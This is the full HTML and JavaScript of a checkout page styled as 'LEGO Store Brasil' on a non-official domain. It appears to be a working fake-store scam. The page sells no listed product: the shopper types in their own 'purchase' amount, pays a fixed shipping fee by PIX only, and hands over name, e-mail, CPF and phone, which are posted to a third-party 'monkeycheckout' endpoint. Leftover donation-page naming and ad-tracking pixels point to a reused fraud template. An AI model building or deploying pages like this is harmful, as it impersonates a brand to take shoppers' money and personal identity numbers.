<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Finalizar Compra - LEGO Store Brasil</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <!-- UTMify pixel configuration for LEGO store -->
    <script>
        window.pixelId = "689d6967a9b91cc128240c1f";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
        document.head.appendChild(a);
    </script>
    <script
        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
        async
        defer
    ></script>
    
    <style>
        body { 
            font-family: 'Inter', sans-serif; 
        }
        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #dc2626;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: #dc2626;
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            z-index: 2000;
            opacity: 0;
            transition: all 0.3s ease;
            min-width: 280px;
            max-width: 85%;
            text-align: center;
            font-weight: 400;
            font-size: 14px;
            line-height: 1.4;
        }

        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }

        .toast.error {
            background: #ef4444;
        }

        .toast.success {
            background: #22c55e;
        }

        .toast.info {
            background: #3b82f6;
        }
    </style>
    
    <!-- LEGO store configuration -->
    <script>
        const CONFIG = {
            API_BASE_URL: "https://monkeycheckout.online/vakinha-luky",
            FRONTEND_URL: "https://legostore.online"
        };
    </script>
</head>
<body class="bg-gray-50">
    <!-- LEGO themed header -->
    <header class="bg-white shadow-sm sticky top-0 z-50">
        <div class="flex items-center justify-between px-4 py-3">
            <div class="flex items-center space-x-2">
                <div class="w-8 h-8 bg-red-600 rounded flex items-center justify-center">
                    <span class="text-white font-bold text-xs">LEGO</span>
                </div>
                <span class="text-red-600 font-bold text-lg">LEGO Store Brasil</span>
            </div>
            <button onclick="window.history.back()" class="text-gray-600 hover:text-gray-800">
                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path>
                </svg>
            </button>
        </div>
    </header>

    <!-- Main Content -->
    <main class="max-w-md mx-auto bg-white min-h-screen">
        <div class="p-4 border-b">
            <h1 class="text-xl font-semibold text-gray-900">Finalizar compra</h1>
        </div>

        <!-- Form -->
        <form id="checkoutForm" class="px-4 py-6 space-y-6">
            <!-- Full Name -->
            <div>
                <label class="block text-gray-700 font-medium mb-2">Nome completo</label>
                <input 
                    type="text" 
                    id="fullName"
                    name="fullName"
                    placeholder="Insira seu nome completo" 
                    class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent"
                >
                <div class="text-xs text-gray-500 mt-1">* Esse dado não será divulgado.</div>
                <div id="fullNameError" class="hidden text-red-500 text-sm mt-1">Nome é obrigatório</div>
            </div>

            <!-- Email -->
            <div>
                <label class="block text-gray-700 font-medium mb-2">E-mail *</label>
                <input 
                    type="email" 
                    id="email"
                    name="email"
                    placeholder="Insira o seu melhor e-mail" 
                    class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent"
                    required
                >
                <div class="text-xs text-gray-500 mt-1">* Esse dado não será divulgado.</div>
                <div id="emailError" class="hidden text-red-500 text-sm mt-1">E-mail é obrigatório</div>
            </div>

            <!-- CPF -->
            <div>
                <label class="block text-gray-700 font-medium mb-2">CPF</label>
                <input 
                    type="text" 
                    id="cpf"
                    name="cpf"
                    placeholder="000.000.000-00" 
                    class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent"
                >
                <div class="text-xs text-gray-500 mt-1">* Esse dado não será divulgado.</div>
            </div>

            <!-- Telefone -->
            <div>
                <label class="block text-gray-700 font-medium mb-2">Telefone</label>
                <input 
                    type="tel" 
                    id="phone"
                    name="phone"
                    placeholder="(11) 99999-9999" 
                    class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-red-500 focus:border-transparent"
                >
                <div class="text-xs text-gray-500 mt-1">* Esse dado não será divulgado.</div>
            </div>

            <!-- Contribution Value -->
            <div>
                <label class="block text-gray-700 font-medium mb-2">Valor da compra *</label>
                <div class="flex">
                    <span class="inline-flex items-center px-3 py-3 border border-r-0 border-gray-300 bg-gray-50 text-gray-700 text-sm rounded-l-lg">R$</span>
                    <input 
                        type="text" 
                        id="amount"
                        name="amount"
                        placeholder="0,00" 
                        class="flex-1 px-4 py-3 border border-gray-300 rounded-r-lg focus:ring-2 focus:ring-red-500 focus:border-transparent"
                        required
                    >
                </div>
                <div id="amountError" class="hidden text-red-500 text-sm mt-1">
                    Valor deve estar entre R$ 20,00 e R$ 2.000,00
                </div>
                <div class="text-xs text-gray-500 mt-1">
                    Mínimo: R$ 20,00 • Máximo: R$ 2.000,00
                </div>
            </div>

            <!-- Payment Method -->
            <div>
                <label class="block text-gray-700 font-medium mb-3">Forma de pagamento</label>
                <div class="flex space-x-2">
                    <button type="button" id="pixBtn" class="px-4 py-2 bg-red-600 text-white rounded-lg font-medium text-sm flex items-center space-x-2">
                        <svg class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M12 2L2 7v10c0 5.55 3.84 9.74 9 11 5.16-1.26 9-5.45 9-11V7l-10-5z"/>
                        </svg>
                        <span>PIX</span>
                    </button>
                </div>
            </div>

            <!-- Validation Errors Container -->
            <div id="validationErrors" class="hidden bg-red-500 text-white p-4 rounded-lg">
                <div class="font-bold mb-2">Por favor, corrija os seguintes erros:</div>
                <ul id="errorList" class="list-disc list-inside space-y-1"></ul>
            </div>

            <!-- Summary -->
            <div class="bg-gray-50 rounded-lg p-4 space-y-2">
                <div class="flex justify-between text-gray-700">
                    <span>Subtotal:</span>
                    <span id="contributionAmount">R$ 0,00</span>
                </div>
                <div class="flex justify-between text-gray-700">
                    <span>Frete:</span>
                    <span>R$ 25,91</span>
                </div>
                <div class="flex justify-between font-bold text-gray-900 text-lg border-t pt-2">
                    <span>Total:</span>
                    <span id="totalAmount">R$ 25,91</span>
                </div>
            </div>

            <!-- Contribute Button -->
            <button type="submit" id="contributeBtn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 px-6 rounded-lg text-lg transition-colors flex items-center justify-center space-x-2">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                </svg>
                <span>FINALIZAR COMPRA</span>
            </button>

            <!-- Legal Text -->
            <p class="text-xs text-gray-500 text-center">
                Ao finalizar a compra você concorda com nossos 
                <a href="#" class="text-red-600 underline">Termos de Uso</a> e 
                <a href="#" class="text-red-600 underline">Política de Privacidade</a>
            </p>
        </form>
    </main>

    <script>
        const API_BASE_URL = CONFIG.API_BASE_URL;
        const VALOR_MINIMO = 20.00;
        const VALOR_MAXIMO = 2000.00;
        const FRETE = 2591; // R$ 25,91 em centavos

        // UTM capture functions
        function getUtmParams() {
            const urlParams = new URLSearchParams(window.location.search);
            return {
                utm_source: urlParams.get('utm_source'),
                utm_medium: urlParams.get('utm_medium'),
                utm_campaign: urlParams.get('utm_campaign'),
                utm_content: urlParams.get('utm_content'),
                utm_term: urlParams.get('utm_term'),
                xcod: urlParams.get('xcod'),
                sck: urlParams.get('sck'),
                utm_id: urlParams.get('utm_id')
            };
        }

        // Currency formatting functions
        function formatCurrency(value) {
            return new Intl.NumberFormat('pt-BR', {
                style: 'currency',
                currency: 'BRL'
            }).format(value / 100);
        }

        function parseCurrency(value) {
            return parseInt(value.replace(/[^\d]/g, '')) || 0;
        }

        function maskMoney(value) {
            let v = value.replace(/\D/g, '');
            v = (v / 100).toFixed(2) + '';
            v = v.replace(".", ",");
            v = v.replace(/(\d)(?=(\d{3})+(?!\d))/g, "$1.");
            return v;
        }

        function maskCPF(value) {
            return value
                .replace(/\D/g, '')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d)/, '$1.$2')
                .replace(/(\d{3})(\d{1,2})/, '$1-$2')
                .replace(/(-\d{2})\d+?$/, '$1');
        }

        function maskPhone(value) {
            return value
                .replace(/\D/g, '')
                .replace(/(\d{2})(\d)/, '($1) $2')
                .replace(/(\d{5})(\d)/, '$1-$2')
                .replace(/(-\d{4})\d+?$/, '$1');
        }

        // Event listeners for masks
        document.getElementById('amount').addEventListener('input', function(e) {
            const cursorPos = e.target.selectionStart;
            const oldLength = e.target.value.length;
            e.target.value = maskMoney(e.target.value);
            const newLength = e.target.value.length;
            e.target.setSelectionRange(cursorPos + (newLength - oldLength), cursorPos + (newLength - oldLength));
            updateSummary();
        });

        document.getElementById('cpf').addEventListener('input', function(e) {
            const cursorPos = e.target.selectionStart;
            const oldLength = e.target.value.length;
            e.target.value = maskCPF(e.target.value);
            const newLength = e.target.value.length;
            e.target.setSelectionRange(cursorPos + (newLength - oldLength), cursorPos + (newLength - oldLength));
        });

        document.getElementById('phone').addEventListener('input', function(e) {
            const cursorPos = e.target.selectionStart;
            const oldLength = e.target.value.length;
            e.target.value = maskPhone(e.target.value);
            const newLength = e.target.value.length;
            e.target.setSelectionRange(cursorPos + (newLength - oldLength), cursorPos + (newLength - oldLength));
        });

        // Update summary
        function updateSummary() {
            const amountInput = document.getElementById('amount');
            const contributionSpan = document.getElementById('contributionAmount');
            const totalSpan = document.getElementById('totalAmount');
            
            const baseValue = parseCurrency(amountInput.value);
            const totalValue = baseValue + FRETE;
            
            const baseFormatted = formatCurrency(baseValue);
            const totalFormatted = formatCurrency(totalValue);
            
            contributionSpan.textContent = baseFormatted;
            totalSpan.textContent = totalFormatted;
        }

        // Validation functions
        function validateForm() {
            const errors = [];
            let hasErrors = false;

            document.querySelectorAll('[id$="Error"]').forEach(el => {
                el.classList.add('hidden');
            });
            document.querySelectorAll('input').forEach(input => {
                input.classList.remove('border-red-500');
            });

            const email = document.getElementById('email').value.trim();
            if (!email) {
                showFieldError('email', 'emailError');
                errors.push('E-mail é obrigatório');
                hasErrors = true;
            } else if (!email.includes('@') || !email.includes('.')) {
                showFieldError('email', 'emailError');
                errors.push('E-mail deve ter um formato válido');
                hasErrors = true;
            }

            const amount = parseCurrency(document.getElementById('amount').value);
            const amountReais = amount / 100;
            
            if (amountReais < VALOR_MINIMO) {
                showFieldError('amount', 'amountError');
                errors.push(`Valor mínimo é R$ ${VALOR_MINIMO.toFixed(2).replace('.', ',')}`);
                hasErrors = true;
            } else if (amountReais > VALOR_MAXIMO) {
                showFieldError('amount', 'amountError');
                errors.push(`Valor máximo é R$ ${VALOR_MAXIMO.toFixed(2).replace('.', ',')}`);
                hasErrors = true;
            }

            if (hasErrors) {
                showValidationErrors(errors);
                return false;
            }

            return true;
        }

        function showFieldError(fieldId, errorId) {
            document.getElementById(fieldId).classList.add('border-red-500');
            document.getElementById(errorId).classList.remove('hidden');
        }

        function showValidationErrors(errors) {
            const errorContainer = document.getElementById('validationErrors');
            const errorList = document.getElementById('errorList');
            
            errorList.innerHTML = '';
            errors.forEach(error => {
                const li = document.createElement('li');
                li.textContent = error;
                errorList.appendChild(li);
            });
            
            errorContainer.classList.remove('hidden');
            errorContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }

        function hideValidationErrors() {
            document.getElementById('validationErrors').classList.add('hidden');
        }

        // Toast notifications
        function showToast(message, type = 'success') {
            const existingToast = document.querySelector('.toast');
            if (existingToast) {
                existingToast.remove();
            }

            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.textContent = message;
            
            document.body.appendChild(toast);
            
            setTimeout(() => {
                toast.classList.add('show');
            }, 100);
            
            setTimeout(() => {
                toast.classList.remove('show');
                setTimeout(() => {
                    if (toast.parentNode) {
                        toast.parentNode.removeChild(toast);
                    }
                }, 300);
            }, 4000);
        }

        // Form submission
        document.getElementById('checkoutForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            console.log('🚀 Iniciando processo de pagamento LEGO...');
            
            if (!validateForm()) {
                console.log('❌ Validação falhou');
                return;
            }

            hideValidationErrors();
            
            const btn = document.getElementById('contributeBtn');
            const originalHTML = btn.innerHTML;
            
            try {
                btn.innerHTML = '<div class="loading-spinner mx-auto"></div>';
                btn.disabled = true;

                const utmParams = getUtmParams();
                const baseAmount = parseCurrency(document.getElementById('amount').value);
                const totalAmount = baseAmount + FRETE;

                const fullName = document.getElementById('fullName').value.trim();
                const email = document.getElementById('email').value.trim();
                const cpf = document.getElementById('cpf').value.replace(/\D/g, '');
                const phone = document.getElementById('phone').value.replace(/\D/g, '');

                const paymentData = {
                    ...utmParams,
                    nome: fullName,
                    email: email,
                    cpf: cpf,
                    telefone: phone
                };

                console.log('📤 Enviando dados LEGO para API:', {
                    valor: totalAmount,
                    dados: paymentData
                });

                const response = await fetch(`${API_BASE_URL}/pagamento.php?valor=${totalAmount}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(paymentData)
                });

                const data = await response.json();
                console.log('📥 Resposta da API:', data);

                if (data.success) {
                    const params = new URLSearchParams({
                        token: data.token,
                        qrcode: data.pixCopiaECola || data.pixCode,
                        amount: document.getElementById('amount').value,
                        name: fullName || 'Cliente LEGO',
                        email: email,
                        ...utmParams
                    });
                    
                    console.log('🔄 Redirecionando para PIX LEGO...');
                    window.location.href = `pix.html?${params.toString()}`;
                } else {
                    throw new Error(data.message || 'Erro ao gerar PIX');
                }

            } catch (error) {
                console.error('❌ Erro:', error);
                showToast('Erro ao processar pagamento: ' + error.message, 'error');
            } finally {
                btn.innerHTML = originalHTML;
                btn.disabled = false;
            }
        });

        // Initialization
        document.addEventListener('DOMContentLoaded', function() {
            console.log('✅ LEGO Checkout carregado');
            console.log('🌐 API Base URL:', API_BASE_URL);
            console.log('📊 UTM Params:', getUtmParams());
            
            const urlParams = new URLSearchParams(window.location.search);
            const preAmount = urlParams.get('amount');
            if (preAmount) {
                document.getElementById('amount').value = preAmount.replace('R$ ', '').replace(',00', ',00');
                updateSummary();
            }
        });
    </script>
</body>
</html>
